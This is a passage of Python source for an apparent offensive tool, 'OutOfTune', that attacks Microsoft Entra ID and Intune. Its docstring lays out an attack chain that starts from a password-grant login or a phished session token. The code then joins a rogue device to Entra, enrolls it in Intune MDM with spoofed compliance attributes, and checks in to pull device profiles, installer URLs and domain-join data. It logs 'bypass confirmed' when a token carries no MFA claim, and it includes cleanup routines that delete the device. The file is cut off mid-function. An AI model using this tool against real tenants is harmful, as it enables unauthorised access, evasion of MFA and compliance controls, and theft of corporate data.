#!/usr/bin/env python3
"""
Example Attack Chain:
  drs-token  -u user@balh.com -p Password1!       # ROPC
  drs-token  -u user@blah.com -t <drs_token>      # phished session
  device-join  [-n DEVICENAME]
  device-token
  mdm-enroll
  mdm-checkin -r <refresh_token>   --profile profile.json                      # sets primary user

Check Compliance:
  check   -u user@blah.com  -r <refresh_token>

Global flags: --debug  --proxy http://127.0.0.1:8080
"""

import os
import sys
import json
import uuid
import base64
import argparse
import traceback
import xml.etree.ElementTree as ET
from datetime import datetime

import requests
import jwt
import xmltodict
from cryptography import x509
from cryptography.hazmat.primitives.serialization import pkcs12, Encoding, PrivateFormat, NoEncryption
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

requests.packages.urllib3.disable_warnings()

# Ensure UTF-8 output on Windows (box-drawing chars in logger/epilog)
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

class _Tee:
    """Write to multiple streams simultaneously (console + file)."""
    def __init__(self, *streams):
        self._streams = streams
    def write(self, data):
        for s in self._streams:
            s.write(data)
    def flush(self):
        for s in self._streams:
            s.flush()

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from utils.utils import gettokens, get_devicetoken, deviceauth, prtauth, token_renewal_for_enrollment
from device.windows import Windows

# ----------------------
# Globals
# ----------------------

STATE_FILE       = 'chain_state.json'
DEFAULT_DEVICE   = 'CORP-WIN10'
DEFAULT_TENANT   = ''
DRS_RESOURCE     = 'urn:ms-drs:enterpriseregistration.windows.net'
INTUNE_CLIENT_ID = '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223'
PFX_PASSWORD     = b'password'

MDM_DISCOVERY_URL = 'https://enrollment.manage.microsoft.com/enrollmentserver/discovery.svc'

DEBUG = False
PROXY = None

SOAP_FAULT_CODES = {
    '0x80180014': 'Platform blocked by enrollment restriction',
    '0x80180013': 'Device limit reached for this user',
    '0x80180016': 'Device requires admin approval before enrollment',
    '0x80180012': 'MDM terms of service not accepted',
    '0x80180010': 'User has no Intune license',
    '0x80180011': 'Enrollment disabled for this tenant',
}


# ----------------------
# Logger
# ----------------------

class Logger:
    def info(self, msg):    print(f"[*] {msg}")
    def success(self, msg): print(f"[+] {msg}")
    def warning(self, msg): print(f"[!] {msg}")
    def error(self, msg):   print(f"[-] {msg}")
    def alert(self, msg):   print(f"[A] {msg}")
    def debug(self, msg):
        if DEBUG:
            print(f"[D] {msg}")
    def section(self, title):
        width = 60
        print()
        print("-" * width)
        print(f"  {title}")
        print("-" * width)

log = Logger()


# ----------------------
# State file management
# ----------------------

def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_state(updates):
    state = load_state()
    state.update(updates)
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f, indent=2)
    return state

def require_state(*keys):
    """Load state and abort with a clear message if any required key is missing."""
    state = load_state()
    missing = [k for k in keys if not state.get(k)]
    if missing:
        for k in missing:
            log.error(f"State missing '{k}' — run the previous phase first")
        log.error(f"Current state file: {STATE_FILE}")
        sys.exit(1)
    return state


# ----------------------
# Debug helpers
# ----------------------

def dump_token(label, token):
    try:
        header = jwt.get_unverified_header(token)
        claims = jwt.decode(token, options={"verify_signature": False})
        log.info(f"{label} — token claims:")
        for k, v in claims.items():
            if k == 'exp':
                v = f"{v} ({datetime.fromtimestamp(v)})"
            if k == 'iat':
                v = f"{v} ({datetime.fromtimestamp(v)})"
            print(f"    {k:20s} : {v}")
        log.debug(f"{label} — header: {header}")
        return claims
    except Exception as e:
        log.error(f"Failed to decode {label}: {e}")
        log.debug(f"Raw token (first 200): {token[:200]}")
        return {}

def debug_response(label, resp):
    if not DEBUG:
        return
    log.debug(f"{label} — HTTP {resp.status_code} from {resp.url}")
    log.debug(f"{label} — Response headers:")
    for k, v in resp.headers.items():
        print(f"    {k}: {v}")
    body = resp.text
    if len(body) > 2000:
        log.debug(f"{label} — Response body (first 2000):\n{body[:2000]}\n... [truncated]")
    else:
        log.debug(f"{label} — Response body:\n{body}")


# ----------------------
# Shared utilities
# ----------------------

PROFILE_ATTRS = [
    'os_version', 'os_platform', 'os_edition_enroll', 'os_edition_syncml',
    'manufacturer', 'model', 'firmware_ver', 'hw_version', 'device_type_str',
    'oem', 'locale', 'proc_arch', 'mac_address', 'hw_dev_id_enroll',
    'hw_dev_id_syncml', 'bitlocker_status', 'cname',
    'encryption_compliance', 'firewall_status',
    'av_status', 'av_signature_status',
    'antispyware_status', 'antispyware_sig_status',
    'tpm_version', 'secure_boot_state',
    'defender_enabled', 'defender_version', 'defender_sig_out_of_date', 'defender_rtp_enabled',
]

def load_profile(path):
    "Load a device attribute profile JSON. Returns {} if path is None."
    if not path:
        return {}
    with open(path, 'r') as f:
        profile = json.load(f)
    for k in list(profile):
        if k.startswith('_'):
            del profile[k]
    return profile

def apply_profile(device, profile):
    "Overlay profile values onto a Windows device object's instance variables."
    if not profile:
        return
    for attr in PROFILE_ATTRS:
        if attr in profile:
            setattr(device, attr, profile[attr])
    if 'os_version' in profile and 'ssp_version' not in profile:
        device.ssp_version = profile['os_version']
    log.success(f"Device profile: {len(profile)} attribute(s) applied")
    for k, v in profile.items():
        log.info(f"  {k:25s} = {v}")

def extract_pem_python(pfx_path, cert_out, key_out, password=PFX_PASSWORD):
    with open(pfx_path, 'rb') as f:
        pfx_data = f.read()
    private_key, cert, _ = pkcs12.load_key_and_certificates(
        pfx_data, password, backend=default_backend()
    )
    with open(cert_out, 'wb') as f:
        f.write(cert.public_bytes(Encoding.PEM))
    with open(key_out, 'wb') as f:
        f.write(private_key.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption()))

def get_device_id_from_pfx(pfx_path, password=PFX_PASSWORD):
    with open(pfx_path, 'rb') as f:
        pfx_data = f.read()
    _, cert, _ = pkcs12.load_key_and_certificates(pfx_data, password, default_backend())
    cn_attrs = cert.subject.get_attributes_for_oid(x509.NameOID.COMMON_NAME)
    if cn_attrs:
        return cn_attrs[0].value
    return None

def parse_soap_fault(resp_text):
    try:
        root = ET.fromstring(resp_text)
        ns_s = 'http://www.w3.org/2003/05/soap-envelope'
        reason_el = root.find(f'.//{{{ns_s}}}Text')
        reason = reason_el.text if reason_el is not None else 'Unknown reason'
        log.error(f"SOAP Fault reason : {reason}")
        for el in root.iter():
            if 'ErrorCode' in el.tag and el.text:
                desc = SOAP_FAULT_CODES.get(el.text, 'Unrecognised error code')
                log.error(f"SOAP Error code   : {el.text} — {desc}")
                return el.text
    except ET.ParseError:
        log.error(f"Could not parse SOAP fault XML:")
        log.error(resp_text[:800])
    return None

def _validate_token(token, label, rerun_hint, expected_aud=None):
    try:
        claims = jwt.decode(token, options={"verify_signature": False})
    except Exception as e:
        log.error(f"Could not decode {label}: {e}")
        log.error(rerun_hint)
        sys.exit(1)
    exp = claims.get('exp', 0)
    if datetime.fromtimestamp(exp) < datetime.now():
        log.error(f"{label} expired at {datetime.fromtimestamp(exp)}")
        log.error(rerun_hint)
        sys.exit(1)
    log.debug(f"{label} valid until {datetime.fromtimestamp(exp)}")
    if expected_aud:
        aud = str(claims.get('aud', ''))
        if expected_aud not in aud:
            log.warning(f"{label} aud '{aud}' -- expected '{expected_aud}'")
        else:
            log.success(f"{label} audience confirmed")
    return claims

def _debug_cert(pfx_path, label):
    if not DEBUG:
        return
    try:
        with open(pfx_path, 'rb') as f:
            _, cert, _ = pkcs12.load_key_and_certificates(f.read(), PFX_PASSWORD, default_backend())
        log.debug(f"{label} certificate details:")
        log.debug(f"  Subject    : {cert.subject}")
        log.debug(f"  Issuer     : {cert.issuer}")
        log.debug(f"  Not before : {cert.not_valid_before}")
        log.debug(f"  Not after  : {cert.not_valid_after}")
        if cert.not_valid_after < datetime.now():
            log.warning(f"{label} certificate has expired")
    except Exception as e:
        log.warning(f"Could not inspect {label} cert: {e}")

def _cleanup_temp_files(*paths):
    for f in paths:
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError:
                pass

def make_windows_device(device_name, uid, tenant, device_id=None):
    return Windows(
        logger=log,
        os='Windows',
        device_name=device_name,
        deviceid=device_id,
        uid=uid,
        tenant=tenant,
        prt=None,
        session_key=None,
        proxy=PROXY
    )


# ----------------------
# Get token to assign user as device primary user
# ----------------------

DRS_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e'   # 


def exchange_rt_for_manage_token(tenant, refresh_token, client_id=DRS_CLIENT_ID):
    resp = requests.post(
        url=f'https://login.microsoftonline.com/{tenant}/oauth2/token',
        data={
            'grant_type':    'refresh_token',
            'refresh_token': refresh_token,
            'client_id':     client_id,
            'resource':      'https://manage.microsoft.com/',
        },
        proxies=PROXY,
        verify=False,
    )
    resp.raise_for_status()
    tok = resp.json()
    if 'access_token' not in tok:
        raise RuntimeError(f"Token exchange failed: {tok.get('error_description', tok)}")
    return tok['access_token']


# ----------------------
# DRS token (ROPC or pre-obtained access token)
# ----------------------

def cmd_phase1(args):
    log.section("DRS token")

    refresh_token = None   # set by ROPC path; saved to state for mdm-checkin -r reuse

    if not args.access_token and not args.password:
        log.error("Provide either --password (ROPC) or --access-token ")
        log.error("  ROPC path   : drs-token -u user@domain -p Password1!")
        log.error("  Token path  : drs-token -u user@domain -t <drs_token>")
        sys.exit(1)

    if args.access_token and args.password:
        log.warning("Both --access-token and --password provided using --access-token")

    tenant = args.username.split('@')[1] if '@' in args.username else DEFAULT_TENANT
    uid    = args.username.split('@')[0]

    if args.access_token:
        log.info(f"User: {args.username}  (pre-obtained token)")
        access_token = args.access_token
        claims = dump_token("DRS token", access_token)
        aud = str(claims.get('aud', ''))
        if 'drs' not in aud and 'enterpriseregistration' not in aud:
            log.warning(f"Token audience is '{aud}'")
            log.warning(f"Expected audience containing 'drs' or 'enterpriseregistration'")
            log.warning(f"Ensure token was obtained for resource: {DRS_RESOURCE}")
            log.warning("Continuing — device join may still succeed if AAD accepts it")
        else:
            log.success("Token audience confirmed for DRS")
        exp = claims.get('exp', 0)
        if datetime.fromtimestamp(exp) < datetime.now():
            log.error(f"Token has expired at {datetime.fromtimestamp(exp)}")
            log.error("Obtain a fresh token and re-run drs-token")
            sys.exit(1)
        amr = claims.get('amr', [])
        if 'mfa' in str(amr):
            log.success(f"MFA claim present in token amr: {amr}")
        else:
            log.info(f"No MFA claim in token (amr: {amr})")
        token_tenant = claims.get('tid')
        if token_tenant:
            log.debug(f"Tenant ID from token: {token_tenant}")
    else:
        log.info(f"User: {args.username}  (ROPC)")
        try:
            access_token, refresh_token = gettokens(
                args.username, args.password, INTUNE_CLIENT_ID, DRS_RESOURCE, PROXY
            )
        except KeyError as e:
            log.error(f"Token response missing expected key: {e}")
            log.error("Authentication likely failed - check credentials")
            sys.exit(1)
        except Exception as e:
            log.error(f"gettokens(): {type(e).__name__}: {e}")
            if DEBUG:
                traceback.print_exc()
            sys.exit(1)
        if not access_token:
            log.error("access_token is empty - authentication failed silently")
            sys.exit(1)
        claims = dump_token("DRS token", access_token)
        aud = str(claims.get('aud', ''))
        amr = claims.get('amr', [])
        if 'drs' not in aud and 'enterpriseregistration' not in aud:
            log.warning(f"Unexpected token audience: {aud}")
        else:
            log.success("Token audience confirmed for DRS")
        if 'mfa' not in str(amr):
            log.success("bypass confirmed - no MFA claim in amr")
        else:
            log.warning(f"MFA present in amr: {amr}")

    state_update = {
        'username':  args.username,
        'uid':       uid,
        'tenant':    tenant,
        'drs_token': access_token,
    }
    if refresh_token:
        state_update['user_rt'] = refresh_token
        log.info("Refresh token saved to state - mdm-checkin will use it automatically no -r needed")
    save_state(state_update)
    log.success(f"State saved to {STATE_FILE}")
    print()
    log.info("Next step: python OutOfTune.py device-join [-n DEVICENAME]")


# ----------------------
# Device join
# ----------------------

def cmd_phase2(args):
    log.section("Entra device join")
    state = require_state('drs_token', 'username', 'tenant', 'uid')
    device_name = args.device_name or state.get('device_name', DEFAULT_DEVICE)
    tenant      = state['tenant']
    uid         = state['uid']
    drs_token   = state['drs_token']
    pfx_path    = f"{device_name}.pfx"
    log.info(f"Device name : {device_name}")
    log.info(f"Tenant      : {tenant}")
    log.info(f"PFX output  : {pfx_path}")
    _validate_token(drs_token, "DRS token", "Re-run drs-token to get a fresh token")
    try:
        device = make_windows_device(device_name, uid, tenant)
        device.entra_join(username=None, password=None, access_token=drs_token, deviceticket=None)
    except Exception as e:
        log.error(f"entra_join(): {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    if not os.path.exists(pfx_path):
        log.error(f"Expected PFX not found after join: {pfx_path}")
        sys.exit(1)
    device_id = get_device_id_from_pfx(pfx_path)
    log.success(f"Device joined successfully")
    log.info(f"PFX path  : {pfx_path} (password: password)")
    log.info(f"Device ID : {device_id or 'could not extract from cert'}")
    _debug_cert(pfx_path, "Device")
    save_state({'device_name': device_name, 'pfx_path': pfx_path, 'device_id': device_id})
    log.success(f"State saved to {STATE_FILE}")
    print()
    log.info("Next step: python OutOfTune.py device-token [--cert device.pfx]")


# ----------------------
# PHASE 3 — Device token acquisition
# ----------------------

def cmd_phase3(args):
    log.section("Device token (device principal auth)")
    cert_override = getattr(args, 'cert', None)
    state = require_state('tenant') if cert_override else require_state('pfx_path', 'tenant')
    pfx_path = cert_override or state['pfx_path']
    tenant   = state['tenant']
    if not os.path.exists(pfx_path):
        log.error(f"Device PFX not found: {pfx_path}")
        sys.exit(1)
    log.info(f"Device PFX : {pfx_path}{' (--cert override)' if cert_override else ' (from state)'}")
    log.info(f"Tenant     : {tenant}")
    cert_pem = 'device_cert.pem'
    key_pem  = 'device_key.pem'
    try:
        extract_pem_python(pfx_path, cert_pem, key_pem)
    except Exception as e:
        log.error(f"Failed to extract PEM from device PFX: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    try:
        device_token = get_devicetoken(tenant, pfx_path)
    except FileNotFoundError as e:
        log.error(f"FileNotFoundError in get_devicetoken(): {e}")
        sys.exit(1)
    except KeyError as e:
        log.error(f"KeyError in get_devicetoken() response: {e}")
        sys.exit(1)
    except Exception as e:
        log.error(f"get_devicetoken(): {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    finally:
        _cleanup_temp_files(cert_pem, key_pem)
    if not device_token:
        log.error("get_devicetoken() returned nothing")
        sys.exit(1)
    claims = dump_token("Device token", device_token)
    aud = str(claims.get('aud', ''))
    device_id_claim = claims.get('deviceid', 'NOT PRESENT')
    exp = claims.get('exp', 0)
    if 'enrollment.manage.microsoft.com' not in aud:
        log.warning(f"Token audience is '{aud}' - expected 'enrollment.manage.microsoft.com'")
    else:
        log.success("Token audience confirmed for Intune enrollment")
    if device_id_claim == 'NOT PRESENT':
        log.warning("No 'deviceid' claim in token")
    else:
        log.success(f"Device principal confirmed - deviceid: {device_id_claim}")
    if datetime.fromtimestamp(exp) < datetime.now():
        log.error(f"Token already expired - this should not happen")
        sys.exit(1)
    save_state({'device_token': device_token})
    log.success(f"State saved to {STATE_FILE}")
    print()
    log.info("Next step: python OutOfTune.py mdm-enroll [--cert device.pfx] [--profile FILE]")


# ----------------------
# Enrollment URL discovery + Intune MDM enrollment
# ----------------------

def _soap_discover(tenant, device_type):
    discovery_url = MDM_DISCOVERY_URL
    soap_discovery = f"""<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:a="http://www.w3.org/2005/08/addressing"
            xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://schemas.microsoft.com/windows/management/2012/01/enrollment/IDiscoveryService/Discover</a:Action>
    <a:MessageID>urn:uuid:748132ec-a575-4329-b01b-6171a9cf8478</a:MessageID>
    <a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>
    <a:To s:mustUnderstand="1">{discovery_url}</a:To>
  </s:Header>
  <s:Body>
    <Discover xmlns="http://schemas.microsoft.com/windows/management/2012/01/enrollment">
      <request xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
        <EmailAddress>user@{tenant}</EmailAddress>
        <RequestVersion>4.0</RequestVersion>
        <DeviceType>{device_type}</DeviceType>
        <ApplicationVersion>10.0.22621.0</ApplicationVersion>
        <OSEdition>4</OSEdition>
        <AuthPolicies>
          <AuthPolicy>Federated</AuthPolicy>
          <AuthPolicy>OnPremise</AuthPolicy>
        </AuthPolicies>
      </request>
    </Discover>
  </s:Body>
</s:Envelope>"""
    log.info(f"POST {discovery_url}  DeviceType={device_type}")
    enrollment_url = None
    try:
        resp = requests.post(
            discovery_url,
            data=soap_discovery.encode('utf-8'),
            headers={'Content-Type': 'application/soap+xml; charset=utf-8', 'User-Agent': 'ENROLLClient'},
            proxies=PROXY,
            verify=False,
            timeout=30
        )
        debug_response("SOAP Discovery", resp)
        if resp.status_code == 200 and 'Fault' not in resp.text:
            try:
                ns = {'e': 'http://schemas.microsoft.com/windows/management/2012/01/enrollment'}
                root = ET.fromstring(resp.text)
                url_el = root.find('.//e:EnrollmentServiceUrl', ns)
                if url_el is not None and url_el.text:
                    enrollment_url = url_el.text
                    log.success(f"Enrollment URL from SOAP discovery: {enrollment_url}")
            except ET.ParseError as e:
                log.warning(f"Failed to parse SOAP discovery response: {e}")
        elif 'Fault' in resp.text:
            log.warning("SOAP discovery returned a fault:")
            parse_soap_fault(resp.text)
        else:
            log.warning(f"Unexpected discovery response (HTTP {resp.status_code})")
    except Exception as e:
        log.warning(f"SOAP discovery failed: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
    if not enrollment_url:
        enrollment_url = 'https://enrollment.manage.microsoft.com/enrollmentserver/enroll.svc'
        log.warning(f"SOAP discovery did not return EnrollmentServiceUrl — falling back to: {enrollment_url}")
    return enrollment_url


def _enroll_device(device, enrollment_url, enroll_token, is_device_flag):
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    csr_der     = device.create_csr(private_key, device.cname)
    csr_pem_b64 = base64.b64encode(csr_der).decode('utf-8')
    try:
        xml_response = device.send_enroll_request(
            enrollment_url=enrollment_url,
            csr_pem=csr_pem_b64,
            csr_token=enroll_token,
            ztdregistrationid=None,
            is_device=is_device_flag,
            is_hejd=False
        )
    except AttributeError as e:
        log.error(f"AttributeError: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    if DEBUG:
        log.debug(f"Enrollment XML response (first 1000):\n{xml_response[:1000]}")
    try:
        my_cert = device.parse_enroll_response(xml_response)
    except (IndexError, ET.ParseError) as e:
        log.error(f"parse_enroll_response() failed: {e}")
        sys.exit(1)
    if not my_cert:
        log.error("parse_enroll_response() returned None - cert not found in response")
        sys.exit(1)
    return private_key, my_cert


def cmd_phase4(args):
    log.section("SOAP discovery + Intune MDM enrollment")

    cert_override = getattr(args, 'cert', None)
    win_required  = ['device_token', 'device_name', 'tenant', 'uid']
    if not cert_override:
        win_required.append('pfx_path')
    state = require_state(*win_required)

    device_token = state['device_token']
    pfx_path     = cert_override or state['pfx_path']
    device_name  = state['device_name']
    tenant       = state['tenant']
    uid          = state['uid']

    _validate_token(device_token, "Device token", "Re-run device-token", expected_aud='enrollment.manage.microsoft.com')
    override_url = state.get('enrollment_url_override')
    if override_url:
        log.info(f"Using --enroll-url override: {override_url}")
        save_state({'enrollment_url': override_url})
        log.success(f"State saved to {STATE_FILE}")
        return
    enrollment_url = _soap_discover(tenant, 'WindowsPhone')
    device_id = get_device_id_from_pfx(pfx_path)
    log.info(f"Device PFX : {pfx_path}{' (--cert override)' if cert_override else ' (from state)'}")
    log.info(f"Device ID  : {device_id or 'None'}")
    profile = load_profile(getattr(args, 'profile', None))
    try:
        device = make_windows_device(device_name, uid, tenant, device_id)
        apply_profile(device, profile)
        private_key, my_cert = _enroll_device(device, enrollment_url, device_token, True)
    except SystemExit:
        raise
    except Exception as e:
        log.error(f"Raised: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    mdm_pfx_path = f"{device_name}_mdm.pfx"
    device.save_mdm_certs(private_key, my_cert, mdm_pfx_path)
    _debug_cert(mdm_pfx_path, "MDM")
    log.success(f"MDM certificate saved: {mdm_pfx_path}")
    log.success(f"Device successfully enrolled in Intune MDM")
    save_state({'device_os': 'Windows', 'mdm_pfx_path': mdm_pfx_path, 'enrollment_url': enrollment_url, 'profile_path': getattr(args, 'profile', None) or '', 'iw_service_url': None, 'iw_renewal_url': None})
    log.success(f"State saved to {STATE_FILE}")
    print()
    log.info("Next step: python OutOfTune.py mdm-checkin [--cert mdm.pfx] [-r <refresh_token>]")


# ----------------------
# MDM checkin 
# ----------------------

def cmd_phase5(args):
    log.section("PHASE 5 — MDM checkin (OMA-DM SyncML)")

    cert_override = getattr(args, 'cert', None)
    p5_required  = ['device_name', 'tenant', 'uid']
    if not cert_override:
        p5_required.append('mdm_pfx_path')
    state = require_state(*p5_required)

    mdm_pfx_path = cert_override or state['mdm_pfx_path']
    device_name  = state['device_name']
    tenant       = state['tenant']
    uid          = state['uid']

    if not os.path.exists(mdm_pfx_path):
        log.error(f"MDM PFX not found: {mdm_pfx_path}")
        sys.exit(1)

    log.info(f"MDM PFX   : {mdm_pfx_path}{' (--cert override)' if cert_override else ' (from state)'}")
    log.info(f"Device    : {device_name}")
    log.info("Checkin   : https://r.manage.microsoft.com/devicegatewayproxy/cimhandler.ashx")

    _debug_cert(mdm_pfx_path, "MDM")

    cert_out = 'pytune_mdm.crt'
    key_out  = 'pytune_mdm.key'
    try:
            extract_pem_python(mdm_pfx_path, cert_out, key_out)
    except Exception as e:
        log.error(f"PEM extract failed: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)

    profile_path = getattr(args, 'profile', None) or state.get('profile_path') or None
    profile = load_profile(profile_path)

    # --- exchange RT -> manage.microsoft.com AT ---
    user_rt   = getattr(args, 'user_refresh_token', None) or state.get('user_rt') or None
    rt_client = getattr(args, 'rt_client_id', None) or state.get('rt_client_id') or DRS_CLIENT_ID
    user_at = None
    if user_rt:
        log.info(f"Exchanging user RT -> manage.microsoft.com AT  (client: {rt_client}) ...")
        try:
            user_at = exchange_rt_for_manage_token(tenant, user_rt, client_id=rt_client)
            decoded = jwt.decode(user_at, options={"verify_signature": False})
            upn = decoded.get('upn') or decoded.get('unique_name') or decoded.get('sub', '?')
            log.success(f"User token obtained - UPN: {upn}")
            save_state({'user_rt': user_rt, 'rt_client_id': rt_client})
        except Exception as e:
            log.warning(f"Token exchange failed: {e} - no primary user will be set")
    else:
        log.info("No -r provided - device will have no primary user")

    output_path = getattr(args, 'output', None)
    try:
        device = make_windows_device(device_name, uid, tenant)
        apply_profile(device, profile)
        if user_at:
            device.aad_user_token = user_at
        log.info("Starting SyncML loop...")

        if output_path:
            out_file = open(output_path, 'w', encoding='utf-8')
            sys.stdout = _Tee(sys.__stdout__, out_file)
        try:
            device.checkin(mdm_pfx_path)
        finally:
            if output_path:
                sys.stdout = sys.__stdout__
                out_file.close()
                log.info(f"Checkin output written to {output_path}")

    except Exception as e:
        log.error(f"checkin(): {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
    finally:
        _cleanup_temp_files(cert_out, key_out)

    log.success("Complete")
    print()
    log.info("Done — check output for profiles, MSI URLs, ODJ blob")


# ----------------------
# Intune compliance state
# ----------------------

INTUNE_ENROLLMENT_APPID = 'd4ebce55-015a-49b5-a083-c84d1797ae8c'
IW_OS_VERSION       = '10.0.19045.2006'
IW_PATH_SUFFIX      = '/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService'
RENEWAL_PATH_SUFFIX = '/OAuth/StatelessOAuthService/OAuthProxy/'

def _iw_devices_url(iw_base):
    return (f"{iw_base}/Devices?api-version=16.4"
            f"&ssp=WindowsSSP&ssp-version={IW_OS_VERSION}"
            f"&os=Windows&os-version={IW_OS_VERSION}"
            f"&os-sub=None&arch=ARM&mgmt-agent=Mdm")


def cmd_check(args):
    log.section("CHECK — Intune compliance state")
    cert_override = getattr(args, 'cert', None)
    chk_required  = ['device_name', 'tenant', 'uid', 'device_id']
    if not cert_override:
        chk_required.append('pfx_path')
    state = require_state(*chk_required)
    pfx_path    = cert_override or state['pfx_path']
    device_name = state['device_name']
    tenant      = state['tenant']
    uid         = state['uid']
    device_id   = state['device_id']
    log.info(f"Device PFX  : {pfx_path}{' (--cert override)' if cert_override else ' (from state)'}")
    log.info(f"Device ID   : {device_id}")
    log.info(f"uid (state) : '{uid}'")
    log.info(f"Tenant      : {tenant}")
    if not os.path.exists(pfx_path):
        log.error(f"Device PFX not found: {pfx_path}")
        sys.exit(1)
    iwservice_url = getattr(args, 'iw_url', None)     or state.get('iw_service_url')
    renewal_url   = getattr(args, 'renewal_url', None) or state.get('iw_renewal_url')
    if not (iwservice_url and renewal_url):
        enrollment_url = state.get('enrollment_url')
        if not enrollment_url:
            log.error("Cannot resolve IWService URLs — no enrollment_url in state")
            log.error("Run mdm-enroll first, or supply --iw-url and --renewal-url manually")
            sys.exit(1)
        from urllib.parse import urlparse
        parsed = urlparse(enrollment_url)
        base  = f"{parsed.scheme}://{parsed.netloc}"
        iwservice_url = base + IW_PATH_SUFFIX
        renewal_url   = base + RENEWAL_PATH_SUFFIX
        log.info(f"IWService URL (derived) : {iwservice_url}")
        log.info(f"TokenRenewal URL (derived): {renewal_url}")
        save_state({'iw_service_url': iwservice_url, 'iw_renewal_url': renewal_url})
    log.info("deviceauth() — minting PRT...")
    try:
        if getattr(args, 'refresh_token', None):
            prt, session_key = deviceauth(None, None, args.refresh_token, pfx_path, PROXY)
        else:
            prt, session_key = deviceauth(args.username, args.password, None, pfx_path, PROXY)
    except Exception as e:
        log.error(f"deviceauth() failed: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    log.success("PRT obtained")
    log.info(f"prtauth -> enrollment token ({INTUNE_ENROLLMENT_APPID})...")
    result = prtauth(prt, session_key, INTUNE_CLIENT_ID, INTUNE_ENROLLMENT_APPID, None, PROXY)
    if result is None:
        log.error(f"prtauth for {INTUNE_ENROLLMENT_APPID} failed")
        sys.exit(1)
    enrollment_resource_token, _ = result
    log.success("Enrollment resource token obtained")
    log.info("token_renewal -> IWService token...")
    try:
        iw_token = token_renewal_for_enrollment(renewal_url, enrollment_resource_token, PROXY)
    except Exception as e:
        log.error(f"token_renewal_for_enrollment failed: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    if not iw_token:
        log.error("token_renewal_for_enrollment returned empty token")
        sys.exit(1)
    log.success("IWService token obtained")
    log.info(f"GET IWService/Devices  (AadId={device_id})...")
    try:
        resp = requests.get(
            url=_iw_devices_url(iwservice_url),
            headers={"Authorization": f"Bearer {iw_token}"},
            proxies=PROXY,
            verify=False
        )
        resp.raise_for_status()
        devices = resp.json().get('value', [])
    except Exception as e:
        log.error(f"IWService /Devices query failed: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    device_record = None
    for d in devices:
        if d.get('AadId') == device_id:
            device_record = d
            break
    if device_record is None:
        log.error(f"Device {device_id} not found in IWService response")
        sys.exit(1)
    official_name = device_record.get('OfficialName', device_name)
    state_value   = device_record.get('ComplianceState', 'Unknown')
    reasons       = device_record.get('NoncompliantRules') or []
    log.info(f"Device record found : {official_name}")
    log.info(f"Compliance state    : {state_value}")
    if state_value == 'Compliant' or not reasons:
        log.success(f"{official_name} is compliant!")
        return
    log.error(f"{official_name} is NOT compliant")
    for i, reason in enumerate(reasons, 1):
        log.alert(f"Non-compliant reason #{i}:")
        print(f"  SettingID : {reason.get('SettingID')}")
        print(f"  Title     : {reason.get('Title')}")
        if 'ExpectedValue' in reason:
            print(f"  Expected  : {reason.get('ExpectedValue')}")
        print(f"  Desc      : {reason.get('Description')}")



# -------------------------
# ENTRA DELETE — Remove device object from Entra ID
# -------------------------

def cmd_entra_delete(args):
    log.section("Remove device from Entra ID")
    from roadtools.roadlib.deviceauth import DeviceAuthentication

    cert_override = getattr(args, 'cert', None)
    state = require_state('device_name', 'tenant')
    pfx_path    = cert_override or state.get('pfx_path')
    device_name = state['device_name']

    if not pfx_path:
        log.error("No device PFX in state — run device-join first or supply --cert")
        sys.exit(1)
    if not os.path.exists(pfx_path):
        log.error(f"Device PFX not found: {pfx_path}")
        sys.exit(1)

    log.info(f"Device     : {device_name}")
    log.info(f"Device PFX : {pfx_path}")

    cert_out = '_del_device.crt'
    key_out  = '_del_device.key'
    try:
        extract_pem_python(pfx_path, cert_out, key_out)
        device_auth = DeviceAuthentication()
        device_auth.proxies = PROXY
        device_auth.verify  = False
        device_auth.auth.proxies = PROXY
        device_auth.auth.verify  = False
        device_auth.loadcert(pemfile=cert_out, privkeyfile=key_out)
        log.info("Sending DELETE...")
        device_auth.delete_device(cert_out, key_out)
        log.success(f"Device {device_name} deleted from Entra ID")
        save_state({'pfx_path': '', 'device_id': '', 'device_token': '', 'mdm_pfx_path': ''})
    except Exception as e:
        log.error(f"entra_delete: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    finally:
        _cleanup_temp_files(cert_out, key_out)


# -------------------------
# Retire device from Intune MDM
# -------------------------

def cmd_retire_intune(args):
    log.section("Remove device from Intune")

    cert_override      = getattr(args, 'cert', None)
    device_id_override = getattr(args, 'device_id', None)
    tenant_override    = getattr(args, 'tenant', None)
    uid_override       = getattr(args, 'uid', None)
    name_override      = getattr(args, 'device_name', None)

    req_keys = []
    if not cert_override:
        req_keys.append('pfx_path')
    if not device_id_override:
        req_keys.append('device_id')
    if not tenant_override:
        req_keys.append('tenant')
    if not uid_override:
